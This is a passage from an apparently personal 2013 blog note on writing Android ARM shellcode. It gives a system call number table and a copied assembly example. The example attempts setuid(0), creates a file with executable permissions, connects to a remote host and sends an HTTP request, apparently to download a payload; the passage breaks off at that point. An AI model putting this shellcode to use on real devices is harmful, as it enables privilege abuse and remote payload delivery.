<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>@xjump</title>

      

      
          <script src="/slideout/1.0.1/slideout.min.js"></script>
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">

          <script defer src="/katex/0.10.1/katex.min.js" ></script>
          <script defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>
              
          <script defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
              
          
      

      
          <link rel="stylesheet" href="https:&#x2F;&#x2F;xjump.me&#x2F;site.css">
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >
          
      

      
      
    </head>

    <body>
        <div class="container">

            <div id="mobile-navbar" class="mobile-navbar">
              <div class="mobile-header-logo">
                <a href="/" class="logo">@xjump</a>
              </div>
              <div class="mobile-navbar-icon icon-out">
                <span></span>
                <span></span>
                <span></span>
              </div>
            </div>

            <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
              <ul class="mobile-menu-list">
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me">
                            Home
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">
                            Categories
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">
                            Archive
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
                            RSS
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">
                            About
                        </a>
                    </li>
                
              </ul>
            </nav>

            <header id="header">
                <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
                <nav class="menu">
                    <ul>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me">
                                    Home
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">
                                    Categories
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">
                                    Archive
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
                                    RSS
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">
                                    About
                                </a>
                            </li>
                        
                    </ul>
                </nav>
            </header>

            <main>
                <div class="content" id="mobile-panel">
                    



<article class="post">
    
    <header class="post__header">
        <h1 class="post__title">
            <a href="https:&#x2F;&#x2F;xjump.me&#x2F;android-system-call-table-call-in-shellcode&#x2F;">Android shellcodez</a>
        </h1>
        <div class="post__meta">
            <span class="post__time">2013-01-10</span>
            
        </div>
    </header>

    <div class="post-content">
      <p>
    Write some note here.</p>
<p>
    System call table:</p>
<pre style="background-color:#2b303b;">
<code class="language-c" data-lang="c"><span style="color:#d08770;">1</span><span style="color:#c0c5ce;"> exit</span><span style="color:#c0c5ce;">
2 </span><span style="color:#8fa1b3;">fork</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;"> read</span><span style="color:#c0c5ce;">
4 </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;"> open</span><span style="color:#c0c5ce;">
6 </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;"> link</span><span style="color:#c0c5ce;">
10 </span><span style="color:#8fa1b3;">unlink</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;"> execve</span><span style="color:#c0c5ce;">
12 </span><span style="color:#8fa1b3;">chdir</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">14</span><span style="color:#c0c5ce;"> mknod</span><span style="color:#c0c5ce;">
15 </span><span style="color:#8fa1b3;">chmod</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">19</span><span style="color:#c0c5ce;"> lseek</span><span style="color:#c0c5ce;">
20 </span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;"> mount</span><span style="color:#c0c5ce;">
26 </span><span style="color:#8fa1b3;">ptrace</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">29</span><span style="color:#c0c5ce;"> pause</span><span style="color:#c0c5ce;">
33 </span><span style="color:#8fa1b3;">access</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">36</span><span style="color:#c0c5ce;"> sync</span><span style="color:#c0c5ce;">
38 </span><span style="color:#8fa1b3;">rename</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">39</span><span style="color:#c0c5ce;"> mkdir</span><span style="color:#c0c5ce;">
40 </span><span style="color:#8fa1b3;">rmdir</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">41</span><span style="color:#c0c5ce;"> dup</span><span style="color:#c0c5ce;">
42 </span><span style="color:#8fa1b3;">pipe</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">43</span><span style="color:#c0c5ce;"> times</span><span style="color:#c0c5ce;">
45 </span><span style="color:#8fa1b3;">brk</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">51</span><span style="color:#c0c5ce;"> acct</span><span style="color:#c0c5ce;">
52 </span><span style="color:#8fa1b3;">umount2</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">54</span><span style="color:#c0c5ce;"> ioctl</span><span style="color:#c0c5ce;">
55 </span><span style="color:#8fa1b3;">fcntl</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">57</span><span style="color:#c0c5ce;"> setpgid</span><span style="color:#c0c5ce;">
60 </span><span style="color:#8fa1b3;">umask</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">61</span><span style="color:#c0c5ce;"> chroot</span><span style="color:#c0c5ce;">
63 </span><span style="color:#8fa1b3;">dup2</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;"> getppid</span><span style="color:#c0c5ce;">
66 </span><span style="color:#8fa1b3;">setsid</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">67</span><span style="color:#c0c5ce;"> sigaction</span><span style="color:#c0c5ce;">
72 </span><span style="color:#8fa1b3;">sigsuspend</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">73</span><span style="color:#c0c5ce;"> sigpending</span><span style="color:#c0c5ce;">
75 </span><span style="color:#8fa1b3;">setrlimit</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">77</span><span style="color:#c0c5ce;"> getrusage</span><span style="color:#c0c5ce;">
78 </span><span style="color:#8fa1b3;">gettimeofday</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">79</span><span style="color:#c0c5ce;"> settimeofday</span><span style="color:#c0c5ce;">
83 </span><span style="color:#8fa1b3;">symlink</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">85</span><span style="color:#c0c5ce;"> readlink</span><span style="color:#c0c5ce;">
88 </span><span style="color:#8fa1b3;">reboot</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">91</span><span style="color:#c0c5ce;"> munmap</span><span style="color:#c0c5ce;">
92 </span><span style="color:#8fa1b3;">truncate</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">93</span><span style="color:#c0c5ce;"> ftruncate</span><span style="color:#c0c5ce;">
94 </span><span style="color:#8fa1b3;">fchmod</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;"> getpriority</span><span style="color:#c0c5ce;">
97 </span><span style="color:#8fa1b3;">setpriority</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">103</span><span style="color:#c0c5ce;"> syslog</span><span style="color:#c0c5ce;">
104 </span><span style="color:#8fa1b3;">setitimer</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">105</span><span style="color:#c0c5ce;"> getitimer</span><span style="color:#c0c5ce;">
114 </span><span style="color:#8fa1b3;">wait4</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">116</span><span style="color:#c0c5ce;"> sysinfo</span><span style="color:#c0c5ce;">
118 </span><span style="color:#8fa1b3;">fsync</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">120</span><span style="color:#c0c5ce;"> clone</span><span style="color:#c0c5ce;">
122 </span><span style="color:#8fa1b3;">uname</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">125</span><span style="color:#c0c5ce;"> mprotect</span><span style="color:#c0c5ce;">
126 </span><span style="color:#8fa1b3;">sigprocmask</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;"> init_module</span><span style="color:#c0c5ce;">
129 </span><span style="color:#8fa1b3;">delete_module</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">132</span><span style="color:#c0c5ce;"> getpgid</span><span style="color:#c0c5ce;">
133 </span><span style="color:#8fa1b3;">fchdir</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">140</span><span style="color:#c0c5ce;"> _llseek</span><span style="color:#c0c5ce;">
142 </span><span style="color:#8fa1b3;">_newselect</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">143</span><span style="color:#c0c5ce;"> flock</span><span style="color:#c0c5ce;">
144 </span><span style="color:#8fa1b3;">msync</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">145</span><span style="color:#c0c5ce;"> readv</span><span style="color:#c0c5ce;">
146 </span><span style="color:#8fa1b3;">writev</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">148</span><span style="color:#c0c5ce;"> fdatasync</span><span style="color:#c0c5ce;">
150 </span><span style="color:#8fa1b3;">mlock</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">151</span><span style="color:#c0c5ce;"> munlock</span><span style="color:#c0c5ce;">
154 </span><span style="color:#8fa1b3;">sched_setparam</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">155</span><span style="color:#c0c5ce;"> sched_getparam</span><span style="color:#c0c5ce;">
156 </span><span style="color:#8fa1b3;">sched_setscheduler</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">157</span><span style="color:#c0c5ce;"> sched_getscheduler</span><span style="color:#c0c5ce;">
158 </span><span style="color:#8fa1b3;">sched_yield</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">159</span><span style="color:#c0c5ce;"> sched_get_priority_max</span><span style="color:#c0c5ce;">
160 </span><span style="color:#8fa1b3;">sched_get_priority_min</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">161</span><span style="color:#c0c5ce;"> sched_rr_get_interval</span><span style="color:#c0c5ce;">
162 </span><span style="color:#8fa1b3;">nanosleep</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">163</span><span style="color:#c0c5ce;"> mremap</span><span style="color:#c0c5ce;">
168 </span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">172</span><span style="color:#c0c5ce;"> prctl</span><span style="color:#c0c5ce;">
174 </span><span style="color:#8fa1b3;">rt_sigaction</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">175</span><span style="color:#c0c5ce;"> rt_sigprocmask</span><span style="color:#c0c5ce;">
177 </span><span style="color:#8fa1b3;">rt_sigtimedwait</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">180</span><span style="color:#c0c5ce;"> pread64</span><span style="color:#c0c5ce;">
181 </span><span style="color:#8fa1b3;">pwrite64</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">183</span><span style="color:#c0c5ce;"> getcwd</span><span style="color:#c0c5ce;">
184 </span><span style="color:#8fa1b3;">capget</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">185</span><span style="color:#c0c5ce;"> capset</span><span style="color:#c0c5ce;">
186 </span><span style="color:#8fa1b3;">sigaltstack</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">187</span><span style="color:#c0c5ce;"> sendfile</span><span style="color:#c0c5ce;">
190 </span><span style="color:#8fa1b3;">vfork</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">191</span><span style="color:#c0c5ce;"> ugetrlimit</span><span style="color:#c0c5ce;">
192 </span><span style="color:#8fa1b3;">mmap2</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">195</span><span style="color:#c0c5ce;"> stat64</span><span style="color:#c0c5ce;">
196 </span><span style="color:#8fa1b3;">lstat64</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">197</span><span style="color:#c0c5ce;"> fstat64</span><span style="color:#c0c5ce;">
198 </span><span style="color:#8fa1b3;">lchown32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">199</span><span style="color:#c0c5ce;"> getuid32</span><span style="color:#c0c5ce;">
200 </span><span style="color:#8fa1b3;">getgid32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">201</span><span style="color:#c0c5ce;"> geteuid32</span><span style="color:#c0c5ce;">
202 </span><span style="color:#8fa1b3;">getegid32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">203</span><span style="color:#c0c5ce;"> setreuid32</span><span style="color:#c0c5ce;">
204 </span><span style="color:#8fa1b3;">setregid32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">205</span><span style="color:#c0c5ce;"> getgroups32</span><span style="color:#c0c5ce;">
206 </span><span style="color:#8fa1b3;">setgroups32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">207</span><span style="color:#c0c5ce;"> fchown32</span><span style="color:#c0c5ce;">
208 </span><span style="color:#8fa1b3;">setresuid32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">209</span><span style="color:#c0c5ce;"> getresuid32</span><span style="color:#c0c5ce;">
210 </span><span style="color:#8fa1b3;">setresgid32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">211</span><span style="color:#c0c5ce;"> getresgid32</span><span style="color:#c0c5ce;">
212 </span><span style="color:#8fa1b3;">chown32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">213</span><span style="color:#c0c5ce;"> setuid32</span><span style="color:#c0c5ce;">
214 </span><span style="color:#8fa1b3;">setgid32</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">217</span><span style="color:#c0c5ce;"> getdents64</span><span style="color:#c0c5ce;">
219 </span><span style="color:#8fa1b3;">mincore</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">220</span><span style="color:#c0c5ce;"> madvise</span><span style="color:#c0c5ce;">
221 </span><span style="color:#8fa1b3;">fcntl64</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">224</span><span style="color:#c0c5ce;"> gettid</span><span style="color:#c0c5ce;">
240 </span><span style="color:#8fa1b3;">futex</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">248</span><span style="color:#c0c5ce;"> exit_group</span><span style="color:#c0c5ce;">
250 </span><span style="color:#8fa1b3;">epoll_create</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">251</span><span style="color:#c0c5ce;"> epoll_ctl</span><span style="color:#c0c5ce;">
252 </span><span style="color:#8fa1b3;">epoll_wait</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">257</span><span style="color:#c0c5ce;"> timer_create</span><span style="color:#c0c5ce;">
258 </span><span style="color:#8fa1b3;">timer_settime</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">259</span><span style="color:#c0c5ce;"> timer_gettime</span><span style="color:#c0c5ce;">
260 </span><span style="color:#8fa1b3;">timer_getoverrun</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">261</span><span style="color:#c0c5ce;"> timer_delete</span><span style="color:#c0c5ce;">
262 </span><span style="color:#8fa1b3;">clock_settime</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">263</span><span style="color:#c0c5ce;"> clock_gettime</span><span style="color:#c0c5ce;">
264 </span><span style="color:#8fa1b3;">clock_getres</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">265</span><span style="color:#c0c5ce;"> clock_nanosleep</span><span style="color:#c0c5ce;">
266 </span><span style="color:#8fa1b3;">statfs64</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">267</span><span style="color:#c0c5ce;"> fstatfs64</span><span style="color:#c0c5ce;">
269 </span><span style="color:#8fa1b3;">utimes</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">280</span><span style="color:#c0c5ce;"> waitid</span><span style="color:#c0c5ce;">
281 </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">282</span><span style="color:#c0c5ce;"> bind</span><span style="color:#c0c5ce;">
283 </span><span style="color:#8fa1b3;">connect</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">284</span><span style="color:#c0c5ce;"> listen</span><span style="color:#c0c5ce;">
285 </span><span style="color:#8fa1b3;">accept</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">286</span><span style="color:#c0c5ce;"> getsockname</span><span style="color:#c0c5ce;">
287 </span><span style="color:#8fa1b3;">getpeername</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">288</span><span style="color:#c0c5ce;"> socketpair</span><span style="color:#c0c5ce;">
290 </span><span style="color:#8fa1b3;">sendto</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">292</span><span style="color:#c0c5ce;"> recvfrom</span><span style="color:#c0c5ce;">
293 </span><span style="color:#8fa1b3;">shutdown</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">294</span><span style="color:#c0c5ce;"> setsockopt</span><span style="color:#c0c5ce;">
295 </span><span style="color:#8fa1b3;">getsockopt</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">296</span><span style="color:#c0c5ce;"> sendmsg</span><span style="color:#c0c5ce;">
297 </span><span style="color:#8fa1b3;">recvmsg</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">314</span><span style="color:#c0c5ce;"> ioprio_set</span><span style="color:#c0c5ce;">
315 </span><span style="color:#8fa1b3;">ioprio_get</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">316</span><span style="color:#c0c5ce;"> inotify_init</span><span style="color:#c0c5ce;">
317 </span><span style="color:#8fa1b3;">inotify_add_watch</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">318</span><span style="color:#c0c5ce;"> inotify_rm_watch</span><span style="color:#c0c5ce;">
322 </span><span style="color:#8fa1b3;">openat</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">323</span><span style="color:#c0c5ce;"> mkdirat</span><span style="color:#c0c5ce;">
325 </span><span style="color:#8fa1b3;">fchownat</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">327</span><span style="color:#c0c5ce;"> fstatat64</span><span style="color:#c0c5ce;">
328 </span><span style="color:#8fa1b3;">unlinkat</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">329</span><span style="color:#c0c5ce;"> renameat</span><span style="color:#c0c5ce;">
333 </span><span style="color:#8fa1b3;">fchmodat</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">356</span><span style="color:#c0c5ce;"> eventfd2</span><span style="color:#c0c5ce;">
359 </span><span style="color:#8fa1b3;">pipe2</span><span style="color:#c0c5ce;">
</span><span style="color:#d08770;">983042</span><span style="color:#c0c5ce;"> ARM_cacheflush</span><span style="color:#c0c5ce;">
983045 </span><span style="color:#8fa1b3;">ARM_set_tls</span><span style="color:#c0c5ce;">
</span></code></pre><p>
    the Linux system call table api reference:</p>
<p>
    <a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a></p>
<p>
    Write your shellcode on Android, ARM. Have a notice on howto pass the arguments, perform the call and get the result.</p>
<p>
    <a href="http://bbs.pediy.com/showthread.php?t=155774">http://bbs.pediy.com/showthread.php?t=155774</a></p>
<p>
    An Example copy from their:</p>
<pre style="background-color:#2b303b;">
<code class="language-asm" data-lang="asm"><span style="color:#8fa1b3;">.globl _start</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">.</span><span style="color:#96b5b4;">align </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">_start:</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">.code </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">thumb </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
  </span><span style="color:#bf616a;">bx </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">thumb:</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">.code </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">213</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@setuid32(</span><span style="color:#d08770;">0</span><span style="color:#8fa1b3;">)</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">@创建文件</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0x1C</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">lsl </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">4 </span><span style="color:#8fa1b3;">@S_IRWXU</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">lsl </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">1 </span><span style="color:#8fa1b3;">@O_CRE</span><span style="color:#96b5b4;">AT</span><span style="color:#8fa1b3;">|O_WRONLY|O_TRUNC</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">name</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">fd = open(name</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">O_CRE</span><span style="color:#96b5b4;">AT</span><span style="color:#8fa1b3;">|O_WRONLY|O_TRUNC</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">S_IRWXU)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r4</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">6 </span><span style="color:#8fa1b3;">@IPPROTO_TCP</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">1 </span><span style="color:#8fa1b3;">@SOCK_STREAM</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">2 </span><span style="color:#8fa1b3;">@AF_INET</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">250</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">31</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">@建立连接</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">sock = socket(AF_INET</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">SOCK_STREAM</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">IPPROTO_TCP)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r5</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">addr</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">250</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">33</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@connect(sock</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">addr</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#8fa1b3;">)</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">@计算http头长度</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">head</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">b L1</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L0:</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L1:</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">ldrb r0</span><span style="color:#c0c5ce;">, [</span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">cmp </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">bne L0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">sub </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r5</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@write(sock</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">head</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">strlen(head))</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">@跳过http头</span><span style="color:#c0c5ce;">
